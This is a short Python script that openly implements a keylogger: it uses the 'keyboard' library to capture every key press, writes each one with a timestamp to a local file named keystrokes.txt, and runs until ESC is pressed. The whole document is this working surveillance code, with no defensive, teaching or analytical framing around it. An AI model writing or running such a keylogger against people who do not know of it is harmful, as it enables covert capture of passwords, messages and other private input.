import keyboard
import time

def on_key_press(event):
    # Log the key press to a file
    with open('keystrokes.txt', 'a') as f:
        f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")}: {event.name}\n')

# Start the keylogger
print("Keylogger started. Press ESC to stop.")
keyboard.on_press(on_key_press)

# Keep the program running until ESC is pressed
keyboard.wait('esc')
